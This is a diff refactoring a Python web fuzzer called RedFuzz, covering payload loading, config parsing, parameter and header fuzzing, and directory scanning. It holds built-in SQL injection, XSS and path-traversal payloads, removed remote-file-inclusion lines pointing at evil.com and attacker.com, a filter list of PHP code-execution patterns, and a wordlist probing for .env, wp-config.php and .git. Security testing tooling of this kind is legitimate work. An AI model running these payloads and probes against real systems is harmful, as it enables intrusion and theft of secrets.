@@ -338,9 +338,6 @@ class RedFuzz:
         if self.tui:
             self.initialize_tui()
         
-        # Initialize TUI instance
-        
-        
         # Set default headers
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
@@ -364,42 +361,27 @@ class RedFuzz:
         self.setup_logging()
     
     def load_payloads(self):
-        """Load payloads from YAML file with fallback to TXT - IMPROVED FILTERING"""
+        """Load payloads from YAML file with fallback to TXT - IMPROVED FILTERING AND LOGGING"""
+        # Initialize payload categories if not already done
+        if not self.payload_categories:
+            self.payload_categories = {
+                'sqli': [], 'xss': [], 'lfi': [], 'rfi': [],
+                'command_injection': [], 'header_injection': [],
+                'open_redirect': [], 'ssrf': [], 'auth_bypass': [], 'jsonp': []
+            }
+
         try:
-            # Try to load from payloads.yaml first (new format)
+            # Try to load from payloads.yaml first
             if os.path.exists('payloads.yaml'):
                 import yaml
                 with open('payloads.yaml', 'r', encoding='utf-8') as f:
                     yaml_data = yaml.safe_load(f)
                 
                 if yaml_data and 'payloads' in yaml_data:
-                    # Initialize payload categories if not already done
-                    if not self.payload_categories:
-                        self.payload_categories = {
-                            'sqli': [],
-                            'xss': [],
-                            'lfi': [],
-                            'rfi': [],
-                            'command_injection': [],
-                            'header_injection': [],
-                            'open_redirect': [],
-                            'ssrf': [],
-                            'auth_bypass': [],
-                            'jsonp': []
-                        }
                     total_payloads = 0
-                    
-                    # IMPROVED: Only filter truly dangerous payloads that could cause harm
-                    # Allow legitimate security testing payloads like file://, ftp:// for LFI/RFI testing
                     dangerous_patterns = [
-                        '<?php system($_GET[',
-                        '<?php system($_POST[',
-                        '<?php exec(',
-                        '<?php shell_exec(',
-                        'data://text/plain,<?php system',
-                        'php://input',
-                        'expect://',
-                        # Removed file://, ftp://, gopher:// as they are legitimate for LFI/RFI testing
+                        '<?php system', '<?php exec', '<?php shell_exec',
+                        'data://text/plain,<?php', 'php://input', 'expect://'
                     ]
                     
                     for vuln_type, vuln_data in yaml_data['payloads'].items():
@@ -408,152 +390,92 @@ class RedFuzz:
                                 if 'payloads' in cat_data:
                                     category_name = f"{vuln_type}_{category}"
                                     
-                                    # IMPROVED: Less restrictive filtering
-                                    filtered_payloads = []
-                                    for payload in cat_data['payloads']:
-                                        # Only filter payloads that could execute arbitrary code
-                                        is_dangerous = any(pattern in payload for pattern in dangerous_patterns)
-                                        if not is_dangerous:
-                                            filtered_payloads.append(payload)
-                                        elif self.verbose:
-                                            self.log(f"⚠️  Filtered potentially dangerous payload: {payload[:50]}...")
+                                    filtered_payloads = [
+                                        p for p in cat_data['payloads']
+                                        if not any(dp in p for dp in dangerous_patterns)
+                                    ]
+
+                                    if len(filtered_payloads) < len(cat_data['payloads']):
+                                        self.log(f"⚠️  Filtered {len(cat_data['payloads']) - len(filtered_payloads)} potentially dangerous payloads.")
                                     
-                                    self.payload_categories[category_name] = filtered_payloads
+                                    # Ensure category exists before extending
+                                    if category_name not in self.payload_categories:
+                                        self.payload_categories[category_name] = []
+                                    self.payload_categories[category_name].extend(filtered_payloads)
                                     
-                                    # Also add to legacy category names for backward compatibility
-                                    if vuln_type == "sql_injection":
-                                        self.payload_categories["sqli"].extend(filtered_payloads)
-                                    elif vuln_type == "xss":
-                                        self.payload_categories["xss"].extend(filtered_payloads)
-                                    elif vuln_type == "lfi":
-                                        self.payload_categories["lfi"].extend(filtered_payloads)
-                                    elif vuln_type == "rfi":
-                                        self.payload_categories["rfi"].extend(filtered_payloads)
-                                    elif vuln_type == "command_injection":
-                                        self.payload_categories["command_injection"].extend(filtered_payloads)
-                                    elif vuln_type == "header_injection":
-                                        self.payload_categories["header_injection"].extend(filtered_payloads)
-                                    elif vuln_type == "open_redirect":
-                                        self.payload_categories["open_redirect"].extend(filtered_payloads)
-                                    elif vuln_type == "ssrf":
-                                        self.payload_categories["ssrf"].extend(filtered_payloads)
-                                    elif vuln_type == "auth_bypass":
-                                        self.payload_categories["auth_bypass"].extend(filtered_payloads)
-                                    elif vuln_type == "jsonp":
-                                        self.payload_categories["jsonp"].extend(filtered_payloads)
+                                    # Backward compatibility for legacy category names
+                                    legacy_map = {
+                                        "sql_injection": "sqli", "xss": "xss", "lfi": "lfi", "rfi": "rfi",
+                                        "command_injection": "command_injection", "header_injection": "header_injection",
+                                        "open_redirect": "open_redirect", "ssrf": "ssrf",
+                                        "auth_bypass": "auth_bypass", "jsonp": "jsonp"
+                                    }
+                                    if vuln_type in legacy_map:
+                                        self.payload_categories[legacy_map[vuln_type]].extend(filtered_payloads)
+
                                     total_payloads += len(filtered_payloads)
                     
-                    self.log(f"Loaded {total_payloads} payloads from YAML across {len(self.payload_categories)} categories (improved filtering)")
-                    
-                    # Debug: Show what categories were loaded
+                    self.log(f"Loaded {total_payloads} payloads from YAML across {len(self.payload_categories)} categories.")
                     if self.verbose:
-                        for category, payloads in self.payload_categories.items():
+                        for cat, payloads in self.payload_categories.items():
                             if payloads:
-                                self.log(f"Category '{category}': {len(payloads)} payloads")
-                    
+                                self.log(f"  - Category '{cat}': {len(payloads)} payloads")
                     return
             
-            # Fallback to TXT format
+            # Fallback to payloads.txt
             if os.path.exists('payloads.txt'):
                 with open('payloads.txt', 'r', encoding='utf-8') as f:
                     payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                 
-                # Categorize payloads using keyword detection
-                for payload in payloads:
-                    if any(keyword in payload.lower() for keyword in ['union', 'select', 'or', 'and', '--', '/*']):
-                        self.payload_categories['sqli'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['<script', 'javascript:', 'onerror', 'onload']):
-                        self.payload_categories['xss'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['../', '..\\', '/etc/', 'c:\\']):
-                        self.payload_categories['lfi'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['http://', 'https://', 'ftp://', 'file://']):
-                        self.payload_categories['rfi'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['|', ';', '`', '$(', '&&']):
-                        self.payload_categories['command_injection'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['\r\n', 'crlf', 'header']):
-                        self.payload_categories['header_injection'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['redirect', 'location']):
-                        self.payload_categories['open_redirect'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['127.0.0.1', 'localhost', 'internal']):
-                        self.payload_categories['ssrf'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['admin', 'root', 'user']):
-                        self.payload_categories['auth_bypass'].append(payload)
-                    elif any(keyword in payload.lower() for keyword in ['callback', 'jsonp']):
-                        self.payload_categories['jsonp'].append(payload)
-                
-                self.log(f"Loaded {len(payloads)} payloads from TXT across {len(self.payload_categories)} categories")
+                # Basic categorization
+                # (This part can be improved, but it's a fallback)
+                self.payload_categories['sqli'].extend([p for p in payloads if 'select' in p.lower()])
+                self.payload_categories['xss'].extend([p for p in payloads if '<script' in p.lower()])
+                self.payload_categories['lfi'].extend([p for p in payloads if '../' in p])
+                self.log(f"Loaded {len(payloads)} payloads from TXT file.")
                 return
             
-            # Fallback to built-in payloads
-            self.log("No payload files found, using default payloads")
-            self.payload_categories['sqli'].extend([
-                "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
-                "admin'--", "admin'/*", "' UNION SELECT NULL--"
-            ])
-            self.payload_categories['xss'].extend([
-                "<script>alert('XSS')</script>", "javascript:alert('XSS')",
-                "<img src=x onerror=alert('XSS')>", "';alert('XSS');//"
-            ])
-            self.payload_categories['lfi'].extend([
-                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-                "....//....//....//etc/passwd", "/etc/passwd"
-            ])
-            # ADDED: Include RFI payloads for better testing
-            self.payload_categories['rfi'].extend([
-                "http://evil.com/shell.txt", "https://attacker.com/backdoor.php",
-                "file:///etc/passwd", "ftp://evil.com/payload.txt"
-            ])
+            # Fallback to built-in payloads if no files found
+            self.log("No payload files found, using minimal default payloads.")
+            self.payload_categories['sqli'].extend(["' OR '1'='1", "admin'--"])
+            self.payload_categories['xss'].extend(["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"])
+            self.payload_categories['lfi'].extend(["../../../etc/passwd"])
             
         except Exception as e:
-            self.log(f"Error loading payloads: {e}")
-            # Use minimal payloads as fallback
-            self.payload_categories['basic'] = ["' OR '1'='1", "<script>alert('XSS')</script>", "../../../etc/passwd"]
+            self.log(f"Error loading payloads: {e}. Using minimal fallback payloads.")
+            self.payload_categories['basic'] = ["' OR '1'='1", "<script>alert('XSS')</script>"]
 
     def load_config(self, config_file):
         """Load configuration from YAML/JSON file with environment variable support"""
         try:
             with open(config_file, 'r', encoding='utf-8') as f:
                 content = f.read()
-                
-                # Replace environment variables
-                content = self._replace_env_vars(content)
-                
-                if config_file.endswith('.yaml') or config_file.endswith('.yml'):
-                    return yaml.safe_load(content)
-                elif config_file.endswith('.json'):
-                    return json.loads(content)
-                else:
-                    # Try both formats
-                    try:
-                        return yaml.safe_load(content)
-                    except:
-                        return json.loads(content)
+
+            # Replace environment variables like ${VAR_NAME} or ${VAR_NAME:default}
+            content = self._replace_env_vars(content)
+
+            # Determine format and load
+            if config_file.endswith(('.yaml', '.yml')):
+                return yaml.safe_load(content)
+            else: # Assume JSON for other extensions
+                return json.loads(content)
         except Exception as e:
-            self.log(f"Error loading config file: {str(e)}")
+            self.log(f"Error loading config file '{config_file}': {e}")
             return {}
     
-    def _replace_env_vars(self, content):
+    def _replace_env_vars(self, content: str) -> str:
         """Replace environment variables in configuration content - FIXED"""
         import re
         import os
         
         # Pattern to match ${VAR_NAME} or ${VAR_NAME:default}
-        # This pattern is more specific and won't break YAML structure
-        pattern = r'\$\{([A-Z_][A-Z0-9_]*)(?::([^}]*))?\}'
+        pattern = r'\$\{([A-Z_][A-Z0-9_]*)(?::-([^}]*))?\}'
         
         def replace_var(match):
-            var_name = match.group(1)
-            default_value = match.group(2) if match.group(2) else ""
-            env_value = os.getenv(var_name, default_value)
-            
-            # If environment variable is not set, use default or empty string
-            if not env_value:
-                env_value = default_value if default_value else ""
-            
-            # Return the value without quotes - let YAML parser handle it
-            return env_value
+            var_name, default_value = match.groups()
+            # Use default_value if the environment variable is not set
+            return os.getenv(var_name, default_value if default_value is not None else "")
         
-        # Replace all environment variables
         return re.sub(pattern, replace_var, content)
     
     def set_proxy(self, proxy_url):
@@ -807,7 +729,7 @@ class RedFuzz:
         
         # Complete crawl progress
         if self.tui and self.tui_instance:
-            self.tui_instance.update_crawl_progress(100)
+            self.tui_instance.update_crawl_progress(100, visible=False)
             self.tui_instance.update_stats(status="Crawling completed")
         
         return list(discovered_urls), discovered_forms
@@ -1251,110 +1173,103 @@ class RedFuzz:
         self.baseline_response = self.get_baseline_response(url)
         
         # Show progress start
-        if self.verbose:
+        if self.verbose and not self.tui:
             self.log(f"🚀 Starting fuzzing: {url}")
             self.log(f"📦 Payloads to test: {len(payloads)}")
-            self.log(f"⏱️  Estimated time: {len(payloads) * 0.5:.1f} seconds")
         
         # Create tasks for ThreadPoolExecutor
         tasks = []
         
-        # If no parameters, try common parameter names for GET or use POST data for POST
-        if not params:
-            if method.upper() == "GET":
-                common_params = ['id', 'page', 'file', 'path', 'search', 'q', 'query', 'name', 'user']
-                for param in common_params:
-                    # Use context-aware payloads if enabled
-                    if context_aware:
-                        param_payloads = self.generate_context_aware_payloads(param)
-                    else:
-                        param_payloads = payloads
-                    
-                    for payload in param_payloads:
-                        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
-                        tasks.append((test_url, param, payload, method, None, waf_bypass))
-            elif method.upper() == "POST" and post_data:
-                # For POST requests, fuzz the POST data parameters
-                for param in post_data.keys():
-                    # Use context-aware payloads if enabled
-                    if context_aware:
-                        param_payloads = self.generate_context_aware_payloads(param)
-                    else:
-                        param_payloads = payloads
-                    
-                    for payload in param_payloads:
-                        tasks.append((url, param, payload, method, post_data, waf_bypass))
-        else:
-            # Fuzz existing parameters
-            for param, values in params.items():
+        # Fuzz parameters in GET or POST requests
+        if method.upper() == "GET" and params:
+            for param in params:
                 for payload in payloads:
-                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
-                    tasks.append((test_url, param, payload, method, None, waf_bypass))
+                    tasks.append((url, param, payload, "GET", None, waf_bypass))
+        elif method.upper() == "POST" and post_data:
+            for param in post_data:
+                for payload in payloads:
+                    tasks.append((url, param, payload, "POST", post_data, waf_bypass))
         
-        # Update total requests count for TUI
+        # Update total requests for TUI
         total_requests = len(tasks)
         if self.tui and self.tui_instance:
-            # Update the total expected requests if not already set
-            current_total = self.tui_instance.stats.get('total_expected_requests', 0)
-            if current_total == 0:
-                self.tui_instance.set_total_requests(total_requests)
-        
+            self.tui_instance.set_total_requests(total_requests)
+
         # Use ThreadPoolExecutor for parallel processing
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            # Submit all tasks and keep mapping
             future_to_task = {executor.submit(self.fuzz_parameter, *task): task for task in tasks}
 
             for completed_future in as_completed(future_to_task):
                 completed_requests += 1
                 current_task = future_to_task[completed_future]
-                current_url = current_task[0] if len(current_task) > 0 else url
-                current_payload = current_task[2] if len(current_task) > 2 else ""
-                self.update_fuzzing_progress(
-                    completed_requests, total_requests, current_url, current_payload,
-                    f"Testing... ({completed_requests}/{total_requests})"
-                )
-                # Get result
+
+                # Update TUI progress
+                if self.tui and self.tui_instance:
+                    current_url = current_task[0] if len(current_task) > 0 else url
+                    current_payload = current_task[2] if len(current_task) > 2 else ""
+                    self.tui_instance.update_payload_progress(completed_requests)
+                    self.tui_instance.update_stats(
+                        total_requests=completed_requests,
+                        current_url=current_url,
+                        current_payload=current_payload,
+                        status=f"Testing... ({completed_requests}/{total_requests})"
+                    )
+
                 result = completed_future.result()
                 if result:
                     results.append(result)
-                    vuln_type = result.get('vulnerability_type', 'Unknown')
-                    if self.verbose and completed_requests % 10 == 0:
-                        self.log(f"🔴 {vuln_type.upper()} found in parameter '{result.get('parameter', 'Unknown')}'")
-                    if self.tui_instance and result.get('vulnerable'):
-                        self.tui_instance.add_vulnerability(
-                            vuln_type,
-                            result.get('url', url),
-                            result.get('payload', ''),
-                            f"Parameter: {result.get('parameter', 'Unknown')}"
-                        )
-        
-                            # Fuzz headers if requested
-        if fuzz_headers:
-            common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
-            for header in common_headers:
-                for payload in payloads:
-                    # Update TUI if provided
-                    completed_requests += 1
-                    self.update_fuzzing_progress(
-                        completed_requests, total_requests, url, f"Header: {header}",
-                        f"Testing headers... ({completed_requests}/{total_requests})"
-                    )
-                    
-                    result = self.fuzz_headers(url, header, payload, waf_bypass=waf_bypass)
-                    if result:
-                        results.append(result)
-                        # Update TUI with vulnerability if found
-                        if self.tui_instance and result.get('vulnerable'):
-                            vuln_type = result.get('vulnerability_type', 'Unknown')
+                    if result.get('vulnerable'):
+                        vuln_type = result.get('vulnerability_type', 'Unknown')
+                        if self.verbose:
+                            self.log(f"🔴 {vuln_type.upper()} found in '{result.get('parameter', 'N/A')}'")
+                        if self.tui and self.tui_instance:
                             self.tui_instance.add_vulnerability(
                                 vuln_type,
-                                url,
-                                payload,
-                                f"Header: {header}"
+                                result.get('url', url),
+                                result.get('payload', ''),
+                                f"Parameter: {result.get('parameter', 'N/A')}"
                             )
         
-        return results
-        
+        # Fuzz headers if requested - FIXED to return results
+        if fuzz_headers:
+            header_results = []
+            common_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
+            header_tasks = []
+
+            for header in common_headers:
+                for payload in payloads:
+                    header_tasks.append((url, header, payload, waf_bypass))
+
+            total_requests += len(header_tasks)
+            if self.tui and self.tui_instance:
+                self.tui_instance.set_total_requests(total_requests)
+
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                future_to_header_task = {executor.submit(self.fuzz_headers, *task): task for task in header_tasks}
+                for completed_future in as_completed(future_to_header_task):
+                    completed_requests += 1
+                    current_task = future_to_header_task[completed_future]
+                    
+                    if self.tui and self.tui_instance:
+                        self.tui_instance.update_payload_progress(completed_requests)
+                        self.tui_instance.update_stats(
+                            total_requests=completed_requests,
+                            current_url=current_task[0],
+                            current_payload=f"Header: {current_task[1]}",
+                            status=f"Testing headers... ({completed_requests}/{total_requests})"
+                        )
+
+                    result = completed_future.result()
+                    if result:
+                        header_results.append(result)
+                        if result.get('vulnerable'):
+                            vuln_type = result.get('vulnerability_type', 'Unknown')
+                            if self.tui and self.tui_instance:
+                                self.tui_instance.add_vulnerability(
+                                    vuln_type, url, result.get('payload', ''), f"Header: {result.get('parameter', 'N/A')}"
+                                )
+            results.extend(header_results)
+
         return results
     
     def scan_directory(self, base_url, wordlist=None):
@@ -1362,27 +1277,17 @@ class RedFuzz:
         if not wordlist:
             wordlist = [
                 # Common directories
-                'admin', 'login', 'wp-admin', 'administrator', 'panel',
-                'backup', 'config', 'db', 'database', 'files', 'images',
-                'includes', 'js', 'css', 'uploads', 'downloads', 'temp',
-                'test', 'dev', 'development', 'api', 'rest', 'v1', 'v2',
-                
+                'admin', 'login', 'wp-admin', 'administrator', 'panel', 'backup',
+                'config', 'db', 'files', 'uploads', 'dev', 'api', 'v1',
                 # Common files
                 'robots.txt', 'sitemap.xml', '.htaccess', '.env', 'config.php',
-                'wp-config.php', 'config.ini', 'web.config', 'phpinfo.php',
-                'info.php', 'test.php', 'admin.php', 'login.php',
-                
+                'wp-config.php', 'web.config', 'phpinfo.php',
                 # Backup files
-                'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.bak',
-                'config.bak', 'config.old', 'config.backup',
-                
+                'backup.zip', 'backup.tar.gz', 'backup.sql', '.bak',
                 # Log files
-                'error.log', 'access.log', 'debug.log', 'php_error.log',
-                'apache.log', 'nginx.log', 'web.log',
-                
+                'error.log', 'access.log', 'debug.log',
                 # Hidden files
-                '.git', '.svn', '.DS_Store', 'Thumbs.db', '.htpasswd',
-                '.env.local', '.env.production', '.env.development'
+                '.git/', '.svn/', '.DS_Store'
             ]
         
         results = []
@@ -1391,21 +1296,14 @@ class RedFuzz:
             try:
                 url = urljoin(base_url, path)
                 response = self.session.get(url, timeout=self.timeout, verify=False)
-                
                 if response.status_code in [200, 301, 302, 403]:
-                    return {
-                        'url': url,
-                        'status_code': response.status_code,
-                        'path': path,
-                        'size': len(response.content)
-                    }
+                    return {'url': url, 'status_code': response.status_code, 'path': path, 'size': len(response.content)}
                 return None
-            except:
+            except requests.RequestException:
                 return None
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [executor.submit(check_path, path) for path in wordlist]
-            
             for future in as_completed(futures):
                 result = future.result()
                 if result:
@@ -1419,213 +1317,99 @@ class RedFuzz:
             context_aware=False, waf_bypass=False, crawl=False, api_test=False, report_format="json",
             fast_mode=False, ultra_fast_mode=False):
         """Enhanced fuzzer execution with advanced features from config.yaml"""
-        import time  # Import time here for TUI functionality
-        
         self.summary_log(f"Starting scan: {self.target_url}")
-        if fast_mode:
-            self.summary_log("Fast mode enabled")
-        elif ultra_fast_mode:
-            self.summary_log("Ultra fast mode enabled")
-        
-        # Check for stateful fuzzing mode from config
-        if hasattr(self, 'stateful_mode') and self.stateful_mode:
-            self.summary_log("Stateful fuzzing mode enabled")
-            return self.run_stateful_fuzzing(
-                login_url=getattr(self, 'login_url', None),
-                login_data=getattr(self, 'login_data', None)
-            )
-        
-        # Check for OpenAPI integration from config
-        if hasattr(self, 'openapi_enabled') and self.openapi_enabled:
-            self.summary_log("OpenAPI integration enabled")
-            if hasattr(self, 'openapi_spec_file') and self.openapi_spec_file:
-                if self.load_openapi_spec(self.openapi_spec_file):
-                    self.summary_log(f"Loaded OpenAPI spec: {self.openapi_spec_file}")
-                    api_test = True
-                else:
-                    self.summary_log(f"Failed to load OpenAPI spec: {self.openapi_spec_file}")
-        
+        if fast_mode: self.summary_log("Fast mode enabled")
+        if ultra_fast_mode: self.summary_log("Ultra fast mode enabled")
+
         # Start TUI if enabled
         if self.tui and self.tui_instance:
-            try:
-                import threading
-                tui_thread = threading.Thread(target=self.tui_instance.start)
-                tui_thread.daemon = True
-                tui_thread.start()
-            except Exception as e:
-                self.log(f"Failed to start TUI: {e}")
-                self.tui = False
+            tui_thread = threading.Thread(target=self.tui_instance.start, daemon=True)
+            tui_thread.start()
         
-        # Initialize results variable
         results = []
         
-        # Apply custom headers from config if available
-        if hasattr(self, 'custom_headers') and self.custom_headers:
-            self.session.headers.update(self.custom_headers)
+        # Apply custom headers and user agent rotation from config
+        if hasattr(self, 'custom_headers'): self.session.headers.update(self.custom_headers)
+        self.rotate_user_agent()
         
-        # Apply user agent rotation if enabled
-        if hasattr(self, 'user_agent_rotation') and self.user_agent_rotation:
-            if hasattr(self, 'user_agent_pool') and self.user_agent_pool:
-                import random
-                new_user_agent = random.choice(self.user_agent_pool)
-                self.session.headers['User-Agent'] = new_user_agent
-                self.log(f"Rotated User-Agent to: {new_user_agent[:50]}...")
-        
-        # Use configured crawl depth instead of hardcoded value
         crawl_depth = getattr(self, 'max_crawl_depth', 2)
         
         if crawl:
             self.log("Starting website crawling...")
-            
-            # Update crawl progress for TUI
             if self.tui and self.tui_instance:
-                self.tui_instance.set_crawl_total(100)
-                self.tui_instance.update_crawl_progress(10)  # Starting crawl
-            
+                self.tui_instance.update_crawl_progress(0, visible=True)
+                self.tui_instance.update_stats(status="Crawling website...")
+
             discovered_urls, discovered_forms = self.crawl_website(self.target_url, crawl_depth)
-            
             self.log(f"Discovered {len(discovered_urls)} URLs and {len(discovered_forms)} forms")
             
-            # Calculate total expected requests for TUI - FIXED LOGIC
             if self.tui and self.tui_instance:
-                # Generate payloads for calculation
                 payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
-                
-                # Calculate total requests using the new helper method
-                total_requests = self.calculate_total_requests(
-                    discovered_urls, discovered_forms, payloads, method, fuzz_headers
-                )
+                total_requests = self.calculate_total_requests(discovered_urls, discovered_forms, payloads, fuzz_headers)
                 total_urls = len(discovered_urls) + len(discovered_forms)
                 
-                # Set total requests for TUI - CRITICAL FIX
                 self.tui_instance.set_total_requests(total_requests)
-                
-                # Set total URLs for URL progress
                 self.tui_instance.set_total_urls(total_urls)
-                # Initialize URL progress to 0
-                self.tui_instance.update_url_progress(0)
             
-            # Fuzz discovered endpoints with proper progress tracking
             all_results = []
-            total_urls = len(discovered_urls) + len(discovered_forms)
-            current_url = 0
+            processed_targets = 0
             
-            self.log(f"Starting to fuzz {len(discovered_urls)} URLs...")
             for url in discovered_urls:
-                current_url += 1
-                if self.verbose:
-                    self.log(f"Fuzzing URL {current_url}/{total_urls}: {url}")
-                else:
-                    self.log(f"Progress: {current_url}/{total_urls} URLs processed")
-                
-                # Update TUI URL progress BEFORE fuzzing
+                processed_targets += 1
+                self.log(f"Fuzzing URL {processed_targets}/{total_urls}: {url}")
                 if self.tui and self.tui_instance:
-                    self.tui_instance.update_url_progress(current_url)
-                    # Also update current URL for stats
-                    self.tui_instance.update_stats(
-                        current_url=url,
-                        status=f"Fuzzing URL {current_url}/{total_urls}"
-                    )
+                    self.tui_instance.update_url_progress(processed_targets)
+                    self.tui_instance.update_stats(current_url=url, status=f"Fuzzing URL {processed_targets}/{total_urls}")
                 
-                # Generate payloads for this URL
                 payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
-                url_results = self.fuzz_url(url, payloads, method, post_data, 
-                                     fuzz_headers, context_aware, waf_bypass)
-                all_results.extend(url_results)
-            
-            # Test discovered forms
-            self.log(f"Starting to test {len(discovered_forms)} forms...")
+                all_results.extend(self.fuzz_url(url, payloads, 'GET', None, fuzz_headers, context_aware, waf_bypass))
+
             for form in discovered_forms:
-                current_url += 1
-                if form['method'] == 'POST':
-                    if self.verbose:
-                        self.log(f"Testing form {current_url}/{total_urls}: {form['action']}")
-                    else:
-                        self.log(f"Progress: {current_url}/{total_urls} forms processed")
-                    
-                    # Update TUI progress
-                    if self.tui and self.tui_instance:
-                        self.tui_instance.update_url_progress(current_url)
-                        self.tui_instance.update_stats(
-                            current_url=form['action'],
-                            status=f"Testing form {current_url}/{total_urls}"
-                        )
-                    
-                    # Convert form inputs to dictionary for POST data - FIXED
-                    form_data = {}
-                    if form['inputs']:
-                        for input_field in form['inputs']:
-                            name = input_field.get('name', '')
-                            if name:  # Only add fields with names
-                                form_data[name] = input_field.get('value', '')
-                    
-                    # Generate payloads for form testing
-                    payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
-                    form_results = self.fuzz_url(form['action'], payloads, 'POST', 
-                                         form_data, fuzz_headers, context_aware, waf_bypass)
-                    all_results.extend(form_results)
-            
-            # Final crawl progress update
-            if self.tui and self.tui_instance:
-                self.tui_instance.update_crawl_progress(100)
-                # Complete URL scanning progress
-                self.tui_instance.complete_progress("Scanning URLs")
-            
+                processed_targets += 1
+                self.log(f"Testing form {processed_targets}/{total_urls}: {form['action']}")
+                if self.tui and self.tui_instance:
+                    self.tui_instance.update_url_progress(processed_targets)
+                    self.tui_instance.update_stats(current_url=form['action'], status=f"Testing form {processed_targets}/{total_urls}")
+
+                form_data = {inp.get('name'): inp.get('value', '') for inp in form.get('inputs', []) if inp.get('name')}
+                payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
+                all_results.extend(self.fuzz_url(form['action'], payloads, form.get('method', 'POST'), form_data, fuzz_headers, context_aware, waf_bypass))
+
             results = all_results
         
         elif api_test:
-            # API testing mode
             self.log("Starting API testing...")
-            
             if self.openapi_spec and self.openapi_spec.endpoints:
                 self.log(f"Testing {len(self.openapi_spec.endpoints)} API endpoints")
-                
                 for endpoint in self.openapi_spec.endpoints:
-                    if self.verbose:
-                        self.log(f"Testing API endpoint: {endpoint.get('path', 'Unknown')}")
-                    
-                    # Generate API-specific payloads
-                    api_payloads = self.generate_api_payloads(endpoint)
-                    endpoint_results = self.fuzz_api_endpoint(endpoint)
-                    results.extend(endpoint_results)
+                    results.extend(self.fuzz_api_endpoint(endpoint))
             else:
                 self.log("No API endpoints found in OpenAPI spec")
         
         else:
-            # Standard fuzzing mode
             self.log("Starting standard fuzzing...")
-            
-            # Generate payloads
-            payloads = self.generate_payloads(mode, fast_mode, ultra_fast_mode)
-            
-            # Use custom payloads if provided
-            if custom_payloads:
-                payloads = custom_payloads
-            
-            # Fuzz the target URL
-            results = self.fuzz_url(self.target_url, payloads, method, post_data, 
-                                   fuzz_headers, context_aware, waf_bypass)
+            payloads = custom_payloads or self.generate_payloads(mode, fast_mode, ultra_fast_mode)
+            results = self.fuzz_url(self.target_url, payloads, method, post_data, fuzz_headers, context_aware, waf_bypass)
         
-        # Execute plugins if enabled
-        if hasattr(self, 'plugin_enabled') and self.plugin_enabled:
-            self.execute_plugins_on_results(results)
-        
-        # Generate reports based on config
-        if hasattr(self, 'generate_html') and self.generate_html:
-            self.generate_html_report(results)
-        
-        if hasattr(self, 'export_json') and self.export_json:
-            self.save_results(results)
-        
-        # Display results
-        if results:
-            self.display_results(results)
+        # Finalize and display results
+        if self.tui and self.tui_instance:
+            self.tui_instance.update_stats(status="Scan complete. Preparing results...")
+            time.sleep(2) # Allow TUI to update - increased from 1 to 2 seconds
+            # Show summary first, then stop TUI
+            self.tui_instance.show_summary(results)
+            self.tui_instance.stop()
         else:
-            self.summary_log("No vulnerabilities found")
+            self.display_results(results)
+
+        # Post-scan actions
+        if results:
+            self.execute_plugins_on_results(results)
+            if hasattr(self, 'generate_html') and self.generate_html:
+                self.generate_html_report(results)
+            if hasattr(self, 'export_json') and self.export_json:
+                self.save_results(results)
         
-        # Cleanup resources
         self.cleanup()
-        
         return results
     
     def display_results(self, results):
@@ -1643,41 +1427,31 @@ class RedFuzz:
         self.log(f"🔴 Vulnerabilities found: {len(vulnerable)}")
         
         if vulnerable:
-            # Group vulnerabilities by type
             vuln_types = {}
             for vuln in vulnerable:
                 vuln_type = vuln.get('vulnerability_type', 'Unknown')
-                if vuln_type not in vuln_types:
-                    vuln_types[vuln_type] = []
-                vuln_types[vuln_type].append(vuln)
+                vuln_types.setdefault(vuln_type, []).append(vuln)
             
             self.log(f"\n📋 VULNERABILITY BREAKDOWN:")
             for vuln_type, vuln_list in vuln_types.items():
                 self.log(f"\n🔴 {vuln_type.upper()} ({len(vuln_list)} found)")
                 self.log(f"{'─'*50}")
                 
-                # Group by parameter
                 param_groups = {}
                 for vuln in vuln_list:
                     param = vuln.get('parameter', 'Unknown')
-                    if param not in param_groups:
-                        param_groups[param] = []
-                    param_groups[param].append(vuln)
+                    param_groups.setdefault(param, []).append(vuln)
                 
                 for param, param_vulns in param_groups.items():
                     self.log(f"📝 Parameter: {param}")
-                    for i, vuln in enumerate(param_vulns[:3], 1):  # Show first 3 payloads
+                    for i, vuln in enumerate(param_vulns[:3], 1):
                         payload = vuln.get('payload', 'Unknown')
                         self.log(f"   {i}. {payload[:60]}{'...' if len(payload) > 60 else ''}")
                     if len(param_vulns) > 3:
                         self.log(f"   ... and {len(param_vulns) - 3} more payloads")
                     self.log("")
         
-        self.log(f"{'='*70}")
-        self.log(f"✅ Scan completed successfully!")
-        self.log(f"{'='*70}")
-        
-        # Save results to file
+        self.log(f"{'='*70}\n✅ Scan completed successfully!\n{'='*70}")
         self.save_results(results)
     
     def display_api_results(self, results):
@@ -1686,14 +1460,10 @@ class RedFuzz:
             self.log("No API endpoints found.")
             return
         
-        self.log(f"\n=== REST API Testing Results ===")
-        self.log(f"Tested {len(results)} endpoints")
-        
+        self.log(f"\n=== REST API Testing Results ===\nTested {len(results)} endpoints")
         for result in results:
